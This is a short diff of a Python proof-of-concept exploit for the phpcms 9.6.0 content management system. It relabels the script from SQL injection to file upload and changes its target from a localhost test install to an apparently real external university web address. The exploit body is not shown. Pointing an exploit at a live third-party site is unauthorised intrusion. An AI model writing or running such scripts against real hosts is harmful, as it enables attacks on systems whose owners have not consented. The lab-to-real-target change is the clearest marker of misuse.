@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # coding: utf-8
 #Authon:phyb0x
-#phpcms9.6.0 sqli
+#phpcms9.6.0 upload
 
 import requests
 
@@ -28,4 +28,4 @@ def poc(host):
 	print(url)
 
 if __name__ == '__main__':
-	poc('http://127.0.0.1/phpcmsv9.6.1/')
+	poc('http://foreign.ynufe.edu.cn/')
